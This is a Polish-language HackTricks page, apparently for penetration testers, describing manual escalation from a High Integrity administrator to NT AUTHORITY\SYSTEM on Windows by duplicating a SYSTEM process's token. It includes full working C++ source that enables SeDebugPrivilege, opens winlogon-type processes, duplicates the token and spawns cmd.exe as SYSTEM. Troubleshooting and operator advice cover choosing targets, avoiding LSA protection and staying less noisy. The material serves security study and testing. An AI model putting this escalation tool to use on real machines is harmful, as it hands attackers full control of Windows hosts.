# SeImpersonate z High do System

{{#include ../../banners/hacktricks-training.md}}

Ta strona dotyczy **manualnej** metody przejścia z procesu administratora o **High Integrity** do **`NT AUTHORITY\SYSTEM`** poprzez **otwarcie niezabezpieczonego procesu SYSTEM, zduplikowanie jego tokenu i uruchomienie procesu potomnego z tym tokenem**.

Jeśli masz tylko **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, ale **nie możesz otworzyć odpowiedniego procesu SYSTEM**, ścieżka **Potato / named-pipe** jest zwykle bardziej niezawodna:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Jeśli chcesz uzyskać nie tylko `SYSTEM`, ale **token SYSTEM z możliwie największą liczbą uprawnień**, sprawdź również:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Szybka analiza

Przed próbą przejęcia tokenu szybko zweryfikuj kontekst:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktyczne uwagi:

- Token administratora **High Integrity** zwykle wystarcza do **włączenia `SeDebugPrivilege`** i otwarcia wielu niezabezpieczonych procesów SYSTEM.
- **`CreateProcessWithTokenW` wymaga `SeImpersonatePrivilege`** od wywołującego. Jeśli to API zakończy się błędem `1314`, przełącz się na `CreateProcessAsUserW`, gdy masz już zduplikowany główny token SYSTEM.
- We współczesnym Windows **`lsass.exe` często jest złym celem**, ponieważ **LSA protection / PPL** blokuje dostęp nawet administratorom z `SeDebugPrivilege`. Preferuj **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** lub wczesny **`svchost.exe`** działający jako SYSTEM.
- Nie każdy proces SYSTEM ma równie użyteczny token. Jeśli uzyskasz SYSTEM, ale zauważysz brakujące uprawnienia, spróbuj użyć innego procesu SYSTEM, zamiast zakładać, że technika nie działa.

## Starannie wybierz PID

Najłatwiejszym sposobem na niezawodne działanie jest **wybranie procesu SYSTEM, którego DACL faktycznie pozwala grupie Administrators na odpytywanie procesu i duplikowanie jego tokenu**.

Dobrzy kandydaci do przetestowania w pierwszej kolejności:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- niektóre wczesne instancje `svchost.exe` działające jako SYSTEM

Domyślnie unikaj:

- `lsass.exe` na hostach, na których włączono **RunAsPPL / LSA protection**
- procesów chronionych / wrażliwych z punktu widzenia bezpieczeństwa, które zwracają `Access denied` nawet po włączeniu `SeDebugPrivilege`

Możesz sprawdzić kandydujące procesy oraz ich tokeny/ACL za pomocą **Process Explorer** lub **Process Hacker** uruchomionych z podwyższonymi uprawnieniami.

### Kod

Poniższy kod pochodzi z [tego artykułu o access tokenach](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Przyjmuje **identyfikator procesu jako argument** i uruchamia powłokę poleceń **jako użytkownik** tego procesu.<sup>[[3]](#references)</sup>\
Uruchomiony w procesie High Integrity pozwala **wskazać PID procesu działającego jako System** (np. `winlogon`, `wininit`) i uruchomić `cmd.exe` jako SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Przydatne uwagi dotyczące API / praw dostępu

Przykład używa `MAXIMUM_ALLOWED`, ale w przypadku rzeczywistych operacji warto pamiętać o minimalnych wymaganych elementach:

- `OpenProcessToken()` wymaga jedynie, aby **uchwyt procesu** został otwarty z prawem **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Aby użyć `CreateProcessWithTokenW()`, **uchwyt tokenu podstawowego** musi mieć prawa **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` musi utworzyć **token podstawowy** (`TokenPrimary`), a nie tylko token impersonacji.
- Jeśli impersonowano już SYSTEM, a `CreateProcessWithTokenW()` nadal kończy się błędem `1314`, spróbuj zamiast tego użyć `CreateProcessAsUserW()`.

Oznacza to, że **otwieranie docelowego procesu z `PROCESS_ALL_ACCESS` jest zwykle niepotrzebne i bardziej hałaśliwe** niż zażądanie tylko praw wymaganych do odczytania tokenu.

## Błąd

Czasami próba impersonacji System może się nie powieść i wyświetlić wynik podobny do poniższego:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Oznacza to, że nawet jeśli działasz na poziomie High Integrity, **nie masz wystarczających uprawnień** do docelowego procesu/tokena.\
Sprawdźmy bieżące uprawnienia Administratora do procesów `svchost.exe` za pomocą **Process Explorer** (możesz również użyć **Process Hacker**):

1. Wybierz proces `svchost.exe`
2. Kliknij prawym przyciskiem myszy --> Properties
3. W zakładce "Security" kliknij w prawym dolnym rogu przycisk "Permissions"
4. Kliknij "Advanced"
5. Wybierz "Administrators" i kliknij "Edit"
6. Kliknij "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Powyższy obraz zawiera wszystkie uprawnienia grupy "Administrators" do wybranego procesu (jak widać, w przypadku `svchost.exe` ma ona wyłącznie uprawnienia "Query").

Zobacz uprawnienia grupy "Administrators" do `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

W tym procesie grupa "Administrators" może "Read Memory" oraz "Read Permissions", co prawdopodobnie pozwala jej na impersonate tokena używanego przez ten proces.

### Typowe przyczyny niepowodzeń

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL procesu blokuje dostęp albo cel jest **protected/PPL**. Wybierz inny proces SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: uchwyt tokena został otwarty bez wystarczających praw albo DACL docelowego tokena uniemożliwia jego duplikację.
- **`CreateProcessWithTokenW()` -> `1314`**: wywołujący nie ma obecnie włączonego **`SeImpersonatePrivilege`**. Najpierw spróbuj go włączyć albo użyj `CreateProcessAsUserW()` ze zduplikowanym tokenem primary.
- **`CreateProcessWithTokenW()` -> `1326`** po wcześniejszych niepowodzeniach: często oznacza to po prostu, że wcześniejszy etap duplikacji/impersonation tokena zakończył się niepowodzeniem, więc nie ma użytecznego tokena primary do uruchomienia procesu potomnego.

## Uwagi operatora

- Ta technika świetnie sprawdza się, gdy masz już **local admin + high integrity** i chcesz szybko, ręcznie uzyskać SYSTEM bez uruchamiania usługi ani tworzenia łańcucha coercion z named pipe.
- W zahardeningowanych środowiskach Windows 11 / Server **LSA protection staje się coraz powszechniejsze**, dlatego workflow zakładający, że `lsass.exe` jest zawsze możliwy do odczytu, jest zawodny. **`winlogon.exe` / `wininit.exe` / `services.exe` są zwykle lepszymi pierwszymi celami**.<sup>[[2]](#references)</sup>
- Jeśli trafisz do kontekstu **service account**, a nie do uprzywilejowanego pulpitu administratora, rodzina **Potato** zwykle lepiej pasuje niż rozwiązanie opisane na tej stronie.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Nadużywanie tokenów Windows w celu przejęcia Active Directory bez dotykania LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Zrozumienie i nadużywanie tokenów procesów — część II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
